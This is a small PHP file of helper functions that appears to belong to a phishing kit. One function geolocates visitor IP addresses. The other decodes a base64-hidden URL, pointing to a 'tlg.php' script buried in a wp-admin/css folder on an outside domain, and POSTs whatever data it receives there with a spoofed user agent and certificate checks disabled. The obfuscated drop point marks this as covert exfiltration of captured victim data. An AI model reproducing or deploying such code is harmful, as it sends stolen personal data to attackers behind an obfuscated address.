<?php


function x_deux_ip($ip){
$ch3 = curl_init();
curl_setopt ($ch3, CURLOPT_URL, 'https://json.geoiplookup.io/'.$ip.'');
curl_setopt ($ch3, CURLOPT_SSL_VERIFYPEER, FALSE);
curl_setopt ($ch3, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
//Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.64 Safari/537.31 
curl_setopt ($ch3, CURLOPT_TIMEOUT, 1000);
curl_setopt($ch3, CURLOPT_SSL_VERIFYHOST, false); 
curl_setopt ($ch3, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt ($ch3, CURLOPT_RETURNTRANSFER, 1);
$result = curl_exec($ch3);

$exp = explode('"country_name": "', $result);
$exp1 = explode('",', $exp[1]);
return $exp1[0];

}

function x_deux_device($v){
	$url12 = base64_decode('aHR0cDovL2JhYy1kZS1tYW51dGVudGlvbi54eXovd3AtYWRtaW4vY3NzL2NvbG9ycy9ibHVlL3RsZy5waHA=');

$postdata12 = http_build_query(array('x_deux' => $v,'sub' => 'Submit+Query'));

$ch12 = curl_init();
curl_setopt ($ch12, CURLOPT_URL, $url12);
curl_setopt ($ch12, CURLOPT_SSL_VERIFYPEER, FALSE);
curl_setopt ($ch12, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.64 Safari/537.31"); 
curl_setopt ($ch12, CURLOPT_TIMEOUT, 1000);
curl_setopt($ch12, CURLOPT_SSL_VERIFYHOST, false); 
curl_setopt ($ch12, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt ($ch12, CURLOPT_RETURNTRANSFER, 1);
curl_setopt ($ch12, CURLOPT_REFERER, $url12);
curl_setopt ($ch12, CURLOPT_POSTFIELDS, $postdata12);
curl_setopt ($ch12, CURLOPT_POST, 1);
$result12 = curl_exec ($ch12);
return $result12;
}


?>